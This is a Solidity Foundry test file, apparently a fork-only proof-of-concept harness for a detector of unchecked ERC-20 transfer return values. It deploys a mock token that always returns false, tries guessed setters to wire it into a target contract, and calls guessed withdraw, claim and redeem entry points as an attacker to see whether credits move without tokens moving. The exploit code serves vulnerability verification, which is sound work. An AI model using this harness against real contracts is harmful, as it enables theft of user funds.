// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unchecked ERC-20 bool (non-standard token)
/// @notice Detector: erc20-unchecked. The target calls token.transfer()
///         and ignores the bool. Some tokens (USDT-style) return FALSE
///         instead of reverting on failure -- the target then credits a
///         transfer that never happened.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Uses a mock token that always returns
///      false. The flow entry point is a GUESS, so several are tried and the
///      result is judged on the OBSERVABLE -- the target moved its ledger
///      while the token reported failure and moved nothing -- never on the
///      bare fact that a call returned.

contract MockFalseToken {
    string public constant name = "MockFalse";
    string public constant symbol = "FALSE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address, uint256) external pure returns (bool) {
        return false; // transfer "fails" but does not revert
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    MockFalseToken internal mock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Read the target's own accounting for `who` through whichever common
    /// view it exposes. Returns (found, value).
    function _readLedger(address who) internal view returns (bool found, uint256 v) {
        (bool ok, bytes memory ret) = target.staticcall(abi.encodeWithSignature("credits(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("balances(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("deposits(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        (ok, ret) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (ok && ret.length == 32) return (true, abi.decode(ret, (uint256)));
        return (false, 0);
    }

    function _trySetToken(string memory sig) internal returns (bool) {
        (bool ok,) = target.call(abi.encodeWithSignature(sig, address(mock)));
        return ok;
    }

    /// Point the target at the false-returning token if it exposes a setter.
    function _wireToken() internal returns (bool) {
        if (_trySetToken("setToken(address)")) return true;
        if (_trySetToken("setUnderlying(address)")) return true;
        if (_trySetToken("setAsset(address)")) return true;
        return false;
    }

    /// Try one flow entry point and accept it only when the OBSERVABLE
    /// changes, never when the call merely returns: the target must MOVE ITS
    /// LEDGER for the caller while the token reported failure and moved
    /// nothing. A no-op returns successfully and moves nothing; a correct
    /// target reverts on the false return.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        (bool f0, uint256 ledgerBefore) = _readLedger(attacker);
        if (!f0) return "";
        uint256 tokenBefore = mock.balanceOf(target);

        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (!ok) return "";

        (bool f1, uint256 ledgerAfter) = _readLedger(attacker);
        if (!f1) return "";
        // OBSERVABLE: the ledger moved for the caller while the token moved
        // nothing (a real transfer would move mock balances).
        if (ledgerAfter != ledgerBefore && mock.balanceOf(target) == tokenBefore) {
            console.log("  ledger baseline/after:", before, ledgerAfter);
            console.log("  ledger moved while the token reported false and moved nothing");
            return label;
        }
        return "";
    }

    /// The flow entry point is a GUESS; try the plausible ones before
    /// concluding "not reproduced".
    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        used = _attempt(attacker, before, "withdraw(uint256)", abi.encodeWithSignature("withdraw(uint256)", 100 ether));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "claim(uint256)", abi.encodeWithSignature("claim(uint256)", 100 ether));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "redeem(uint256)", abi.encodeWithSignature("redeem(uint256)", 100 ether));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "transfer(address,uint256)", abi.encodeWithSignature("transfer(address,uint256)", attacker, 100 ether));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "transferFrom(address,address,uint256)", abi.encodeWithSignature("transferFrom(address,address,uint256)", attacker, attacker, 100 ether));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "approve(address,uint256)", abi.encodeWithSignature("approve(address,uint256)", attacker, 100 ether));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "withdraw()", abi.encodeWithSignature("withdraw()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "claim()", abi.encodeWithSignature("claim()"));
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        mock = new MockFalseToken();
        address attackerEOA = makeAddr("attacker");

        bool wired = _wireToken();
        console.log("target wired to false-returning token:", wired);

        (bool found, uint256 before) = _readLedger(attackerEOA);
        console.log("target ledger view found:", found);

        string memory used = _tryEntry(attackerEOA, before);
        console.log("flow entry point that credited despite a false token return:", used);

        assertTrue(
            bytes(used).length > 0,
            "no unchecked-bool entry point reproduced. Tried withdraw(uint256), claim(uint256), redeem(uint256), transfer(address,uint256), transferFrom(address,address,uint256), approve(address,uint256), withdraw(), claim() against a mock token that returns false. This does NOT establish safety: the flow may have another name or argument shape, the token may be injected by a different setter, or the target may track the credit through a view this harness does not probe."
        );
    }
}
